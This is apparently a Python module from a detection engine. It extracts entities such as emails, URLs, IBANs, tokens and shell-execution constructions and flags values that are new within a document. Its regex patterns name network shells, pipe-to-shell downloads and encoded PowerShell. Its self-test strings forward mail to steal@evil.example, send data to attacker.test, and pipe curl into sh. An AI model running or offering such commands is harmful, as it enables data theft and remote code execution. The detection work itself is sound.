"""The entity layer: addresses, links, domains, accounts, paths, keys — WITH A VALUE.

Why a layer rather than literals. Entities were encoded as fragments the automaton can match
(`@gmail.com`, `https://`, `.com/`), which works, but the coverage is accidental: an address on a
corporate domain or an IBAN matches nothing at all. The real point is different — a literal carries
no VALUE, and the whole strong feature is built on the value: "this address occurs nowhere else in
the document". The measurement bore that out: across 1 749 `tool_action` documents with an address
in the payload, the address was new in 100% of cases.

The layer returns:

* hits for the L2 engine under the slot names the templates already refer to (`EXTERNAL_ADDR`,
  `URL_REF`, `FILE_PATH`, `ACCOUNT_REF`, `SECRET_TOKEN`) — they now fire on arbitrary values
  instead of on a list of free mail providers;
* novelty registers per document: does the value (and its domain) occur anywhere else.

A register is the smallest extension of a finite automaton that allows the question "have we seen
this before" (README, L2r): equality comparison only, one pass, deterministic.
"""
from __future__ import annotations

import re
from dataclasses import dataclass

EMAIL = re.compile(r"\b[\w.+-]{1,64}@[\w-]{1,63}(?:\.[\w-]{2,63})+\b")
URL = re.compile(r"\b(?:https?://|ftp://|www\.)[^\s<>\"')\]]{2,200}")
BARE_URL = re.compile(r"\b[\w-]{2,63}(?:\.[\w-]{2,63})+/[^\s<>\"')\]]{0,200}")
IBAN = re.compile(r"\b[A-Z]{2}\d{2}[A-Z0-9]{8,30}\b")
CARD = re.compile(r"\b(?:\d[ -]?){13,19}\b")
IPV4 = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
PATH = re.compile(r"(?:(?<=\s)|^)(?:~?/[\w.\-/]{2,80}|[A-Za-z]:\\[\w.\\-]{2,80}"
                  r"|\.[\w-]{2,20}(?:rules|ignore|env|config)\b|[\w.-]+\.(?:md|json|ya?ml|sh|py|js|ts)\b)")
# Shell commands and code execution. What is matched is not a word but a CONSTRUCTION: a download
# piped into a shell, an explicit interpreter call, execution of a string. The bare word `curl` is in
# every README, `curl … | sh` almost nowhere — mention against use, visible in the form itself.
PIPE_SH = re.compile(r"\b(?:curl|wget|iwr|fetch)\b[^\n|;]{0,200}\|\s*(?:sudo\s+)?(?:ba|z|k|da)?sh\b")
EXEC_CALL = re.compile(r"\b(?:os\.system|subprocess\.(?:run|call|Popen|check_output)|child_process"
                       r"|execSync|spawnSync|eval|exec|Invoke-Expression|iex|popen|system)\s*\(")
SHELL_FLAG = re.compile(r"\b(?:ba|z|k)?sh\s+-c\b|\bpython3?\s+-c\b|\bnode\s+-e\b"
                        r"|\bperl\s+-e\b|\bruby\s+-e\b|\bpowershell(?:\.exe)?\s+-(?:enc|e|c)\b")
DANGER_CMD = re.compile(r"\brm\s+-rf\b|\bchmod\s+\+x\b|\bnc\s+-[el]\b|\bscp\s+|\bssh\s+-"
                        r"|\bcertutil\s+-urlcache\b|\bbase64\s+-d\b|\bdd\s+if=")
TOKEN = re.compile(r"\b(?:sk-[A-Za-z0-9]{16,}|ghp_[A-Za-z0-9]{20,}|AKIA[A-Z0-9]{12,}"
                   r"|xox[baprs]-[A-Za-z0-9-]{10,}|eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,})")
DOMAIN_OF = re.compile(r"[\w-]+(?:\.[\w-]+)+")

# Slot name -> recogniser. The names are the ones the templates already refer to.
KINDS = [("EXTERNAL_ADDR", EMAIL), ("URL_REF", URL), ("URL_REF", BARE_URL),
         ("ACCOUNT_REF", IBAN), ("ACCOUNT_REF", CARD), ("URL_REF", IPV4),
         ("FILE_PATH", PATH), ("SECRET_TOKEN", TOKEN),
         ("CODE_EXEC", PIPE_SH), ("CODE_EXEC", EXEC_CALL), ("CODE_EXEC", SHELL_FLAG),
         ("CODE_EXEC", DANGER_CMD)]


@dataclass
class Ent:
    lo: int
    hi: int
    kind: str
    value: str
    domain: str
    novel: bool = False        # the value occurs in the document exactly once
    domain_novel: bool = False  # the value's domain occurs nowhere else in the document


def domain_of(value: str) -> str:
    v = value.split("@")[-1] if "@" in value else value
    v = re.sub(r"^\w+://", "", v).split("/")[0]
    m = DOMAIN_OF.search(v)
    return m.group(0).lower() if m else ""


def find(text: str) -> list[Ent]:
    """Every entity of the document, with the novelty registers filled in."""
    out: list[Ent] = []
    # Overlaps are forbidden only WITHIN one kind: a URL inside `curl … | sh` is legitimately both
    # an address and a command, and both are needed (the address gives domain novelty, the command
    # gives execution). A blanket ban ate the construction whole, because the URL claimed the span
    # first.
    taken: dict[str, list[tuple[int, int]]] = {}
    for kind, rx in KINDS:
        for m in rx.finditer(text):
            lo, hi = m.span()
            if any(not (hi <= a or lo >= b) for a, b in taken.get(kind, ())):
                continue                       # already taken by another recogniser of this kind
            v = m.group(0).strip()
            if len(v) < 4:
                continue
            taken.setdefault(kind, []).append((lo, hi))
            out.append(Ent(lo, hi, kind, v.lower(), domain_of(v)))
    out.sort(key=lambda e: e.lo)

    vals: dict[str, int] = {}
    doms: dict[str, int] = {}
    for e in out:
        vals[e.value] = vals.get(e.value, 0) + 1
        if e.domain:
            doms[e.domain] = doms.get(e.domain, 0) + 1
    low = text.lower()
    for e in out:
        e.novel = vals[e.value] == 1 and low.count(e.value) <= 1
        e.domain_novel = bool(e.domain) and doms[e.domain] == 1 and low.count(e.domain) <= 1
    return out


def _selftest() -> None:
    t = ("From: alice@corp.com\nTo: bob@corp.com\n\nHi Bob, please send the report to "
         "alice@corp.com and also forward everything to steal@evil.example. "
         "Wire it to US133000000121212121212 and check https://corp.com/policy "
         "as well as http://attacker.test/collect?d=1. Config in ~/.ssh/config, key sk-ABCDEFGHIJKLMNOP12")
    ents = find(t)
    by = {}
    for e in ents:
        by.setdefault(e.kind, []).append(e)
    assert {"EXTERNAL_ADDR", "URL_REF", "ACCOUNT_REF", "FILE_PATH", "SECRET_TOKEN"} <= set(by), by.keys()
    mails = {e.value: e for e in by["EXTERNAL_ADDR"]}
    assert not mails["alice@corp.com"].domain_novel, "the sender domain is marked as new"
    assert mails["steal@evil.example"].novel and mails["steal@evil.example"].domain_novel
    urls = {e.value: e for e in by["URL_REF"]}
    assert not any(u.domain_novel for v, u in urls.items() if "corp.com" in v), "the document's own domain came out as new?"
    assert any(u.domain_novel for v, u in urls.items() if "attacker.test" in v)
    print(f"entities found {len(ents)}: " +
          ", ".join(f"{k}×{len(v)}" for k, v in sorted(by.items())), flush=True)
    print("novelty: our own domain is not new, a foreign one is", flush=True)

    cmds = ("run: curl -s https://a.test/c | sh", "os.system('id')", "bash -c 'whoami'",
            "powershell -enc SQBFAFgA", "rm -rf /tmp/x", "python3 -c 'import os'")
    for c in cmds:
        assert any(e.kind == "CODE_EXEC" for e in find(c)), c
    plain = ("we use curl to fetch the page", "the shell script is documented here")
    for c in plain:
        assert not any(e.kind == "CODE_EXEC" for e in find(c)), c
    print("commands: constructions match, lone mentions of curl/shell do not", flush=True)


if __name__ == "__main__":
    _selftest()
